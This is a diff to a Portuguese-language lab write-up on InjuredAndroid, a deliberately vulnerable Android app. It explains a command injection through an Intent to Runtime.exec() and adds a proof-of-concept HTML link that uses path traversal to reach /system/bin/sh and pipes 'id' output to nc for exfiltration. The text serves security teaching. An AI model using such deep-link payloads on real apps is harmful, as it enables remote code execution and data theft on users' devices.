@@ -103,14 +103,25 @@ A Activity é inicializada na função `onCreate` e é lá que o Intent será de
 88 }
 ```
 
+Na linha 78 é passado para a função `Runtime.getRuntime().exec()` as variáveis `intentParam` e `binaryParam`, essa função executa comandos no sistema, logo temos um [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) através do Intent. Vamos tentar explora-lo!
+
+Normalmente, num Command Injection tentaríamos passar algum carácter para executar outro commando, como `&`/`|`/`;`, porém se tentarmos desse jeito o Android irá dar um erro na primeira parte do comando, o `filesDir.parent + "/files/"`, pois não encontrará o arquivo ou dará erro de permissão e não executará o resto do nosso *payload*. Para resolvermos esse problema podemos voltar os diretórios com `../` até chegarmos no diretório *root*, a partir dai podemos executar o `/system/bin/sh` e executar qualquer comando que quisermos.
+
+Nossa [PoC](https://pt.wikipedia.org/wiki/Prova_de_conceito) terá os seguintes passos :
+
+1. Alvo clica num link malicioso
+2. Browser abre um Intent para `b3nac.injuredandroid.RCEActivity`
+3. A Activity `RCEActivity` executa o comando do atacante
+4. `/system/bin/sh` exfiltra o resultado do comando para um servidor do atacante
+
+```html
+<a href="flag13://rce?binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id|nc %27&param=1">pwn me</a>
+```
 
 
-## Tipos vulnerabilidades
+## Intent Extras
 
-	- XSS
-	- RCE
-	- SQLi
+Exemplo de Intent Extra via Browser ? 
 
 ## Conclusão
 
-## Próximos passos
